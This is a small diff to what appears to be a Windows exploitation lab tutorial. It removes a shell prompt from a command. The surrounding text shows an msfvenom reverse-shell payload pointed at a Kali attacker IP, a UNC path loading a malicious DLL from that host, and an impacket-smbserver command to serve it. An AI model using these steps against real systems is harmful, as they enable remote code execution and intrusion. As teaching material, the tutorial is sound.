@@ -362,7 +362,7 @@ msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.0.2.15 
 
 Now we know from the [UNC](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/62e862f4-2a51-452e-8eeb-dc4ff5ee33cc) datatype that we have to provide a string in the form `= "\\" host-name "\" share-name  [ "\" object-name ]` when attempting to load and attach a DLL to our process. In our case, this could be something like `\\10.0.2.15\ABCD\mal.dll` where `10.0.2.15` is the IP of the Kali, `A` is the name of our SMB share and `mal.dll` is the malicious DLL object we are sharing. We can generate an SMB share using the following command: This should be run in the directory that contains the malicious DLL `mal.dll`.
 ```
-$ sudo impacket-smbserver -smb2support ABCD .
+sudo impacket-smbserver -smb2support ABCD .
 ```
 * `sudo`: This command and operation require root privileges to bind to the well-known SMB port 445.
 * [`impacket-smbserver`](https://www.kali.org/tools/impacket-scripts/#impacket-smbserver):  This is the command the launches a SMB server and add a share as specified.
